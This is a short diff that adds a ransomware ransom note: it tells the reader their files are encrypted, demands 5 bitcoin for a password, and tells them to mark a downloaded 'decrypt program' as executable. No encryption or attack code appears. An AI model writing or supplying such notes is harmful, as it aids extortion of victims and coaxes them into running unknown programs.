@@ -1,0 +1,3 @@
+Your files have been encrypted! There is a decrypt program downloaded to your machine. When you've given a bitcoin wallet information with 5 bitcoin you'll receive the password to get your files back!
+
+If your decrypt program doesn't run you'll need to right click, go to properties, and check executable as program.
